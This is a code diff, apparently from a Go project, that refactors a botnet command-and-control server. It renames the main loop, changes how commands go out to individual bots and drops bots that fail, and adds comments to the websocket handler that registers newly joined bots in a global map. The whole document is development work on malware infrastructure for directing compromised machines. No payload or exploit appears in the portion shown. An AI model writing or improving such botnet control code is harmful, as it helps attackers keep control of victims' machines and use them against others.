@@ -36,8 +36,8 @@ func NewCommandAndControl() (*CommandAndControl, error) {
 	}, nil
 }
 
-// StartBotnet begins botnet communication
-func (cc *CommandAndControl) StartBotnet() {
+// RunBotnet begins botnet communication
+func (cc *CommandAndControl) RunBotnet() {
 	for {
 		select {
 		case msg := <-cc.recvMsgChan:
@@ -76,11 +76,9 @@ func (cc *CommandAndControl) BroadcastCommand(cmd *protocol.Command) {
 }
 
 // SendCommandToBot sends a command to only one given bot
-func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, id string) {
-	select {
-	case cc.bots[id].CmdOutChan <- cmd:
-	default:
-		cc.ReleaseBot(id)
+func (cc *CommandAndControl) SendCommandToBot(cmd *protocol.Command, botID string) {
+	if err := cc.bots[botID].SendCommandToRemote(cmd); err != nil {
+		cc.ReleaseBot(botID)
 	}
 }
 
@@ -99,6 +97,7 @@ func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Reque
 
 // CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
 func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
+	// dispatch a new worker to handle the underlying botnet communication protocol
 	bot, err := ccworker.DispatchNewBot(w, r, cc.msgDecryptKey, cc.recvMsgChan)
 	if err != nil {
 		w.WriteHeader(http.StatusTeapot)
@@ -106,6 +105,7 @@ func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter,
 		log.Printf(" [cmd&ctrl] there was a failed bot dispatch for %s: %s", r.RemoteAddr, r.UserAgent())
 		return
 	}
+	// add bot to global map of bot workers
 	cc.bots[bot.ID] = bot
 	log.Printf("[cmd&ctrl] bot %s joined net", bot.ID)
 }
